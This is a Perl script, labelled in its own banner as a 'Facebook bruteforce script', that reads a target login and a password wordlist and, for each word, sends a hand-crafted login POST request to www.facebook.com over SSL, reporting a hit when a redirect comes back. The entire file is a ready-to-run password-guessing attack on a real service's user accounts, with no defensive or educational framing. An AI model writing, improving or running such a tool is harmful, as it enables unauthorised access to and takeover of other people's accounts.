
use strict;
use Net::SSLeay::Handle;
use Term::ANSIColor;
if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print color("red"), "\n  █████▄▄▄      ▄████▄ ▓█████ ▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▓█████ ██▀███ \n ";
print                "▓██    ▒████▄  ▒██▀ ▀█ ▓█   ▀▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒▓█   ▀▓██ ▒ ██▒\n";
print                "▒████ ▒██  ▀█▄ ▒▓█    ▄▒███  ▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░▒███  ▓██ ░▄█ ▒\n";
print                "░▓█▒  ░██▄▄▄▄██▒▓▓▄ ▄██▒▓█  ▄▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄▒▓█  ▄▒██▀▀█▄  \n";
print                "░▒█░   ▓█   ▓██▒ ▓███▀ ░▒████▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████░██▓ ▒██▒\n";
print                " ▒ ░   ▒▒   ▓▒█░ ░▒ ▒  ░░ ▒░ ░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░\n";
print                " ░      ▒   ▒▒ ░ ░  ▒   ░ ░  ░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░\n";
print                " ░ ░    ░   ▒  ░          ░  ░         ░░   ░  ░   ▒  ░       ░ ░░ ░   ░    ░░   ░ \n";
print                "           ░  ░ ░        ░  ░ ░        ░          ░  ░ ░     ░  ░     ░  ░  ░     \n";
print                "               ░             ░                        ░                            \n";
print                "                           Facebook bruteforce script\n";
print                "                                    420 VHS \n";
print                "                             A e s t h e t i c s\n\n";
print color("reset"), "Command: perl $0 login wordlist\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];
my $second;
my $minute;
my $hour;
my $theTime;

open (LIST, $wordlist) || die color("red"), "\n[!] $wordlist n'est un dicitonnaire valide \n";
color("reset");
($second, $minute, $hour) = localtime(); 
$theTime = "$hour:$minute:$second";

print color("red"), "\n  █████▄▄▄      ▄████▄ ▓█████ ▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▓█████ ██▀███ \n ";
print                "▓██   ▒████▄   ▒██▀ ▀█ ▓█   ▀▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒▓█   ▀▓██ ▒ ██▒\n";
print                "▒████ ▒██  ▀█▄ ▒▓█    ▄▒███  ▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░▒███  ▓██ ░▄█ ▒\n";
print                "░▓█▒  ░██▄▄▄▄██▒▓▓▄ ▄██▒▓█  ▄▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄▒▓█  ▄▒██▀▀█▄  \n";
print                "░▒█░   ▓█   ▓██▒ ▓███▀ ░▒████▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████░██▓ ▒██▒\n";
print                " ▒ ░   ▒▒   ▓▒█░ ░▒ ▒  ░░ ▒░ ░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░\n";
print                " ░      ▒   ▒▒ ░ ░  ▒   ░ ░  ░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░\n";
print                " ░ ░    ░   ▒  ░          ░  ░         ░░   ░  ░   ▒  ░       ░ ░░ ░   ░    ░░   ░ \n";
print                "           ░  ░ ░        ░  ░ ░        ░          ░  ░ ░     ░  ░     ░  ░  ░     \n";
print                "               ░             ░                        ░                            \n";
print                "                           Fumeur de mots de passe Facebook\n";
print                "                             Hackerman hacked your wounds\n";
print                "                                A e s t h e t i c s\n\n";
print color("yellow"), "\n[$theTime] On va tenter de fumer $user \n\n", color("reset");

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "[*] J'ai demandé $password mais il est pas fumé \n";
close SSL;
}
else
{
print color("green"),  "[$theTime] $password semble avoir assez de A e s t h e t i c s \n";
close SSL;
exit;
}
}
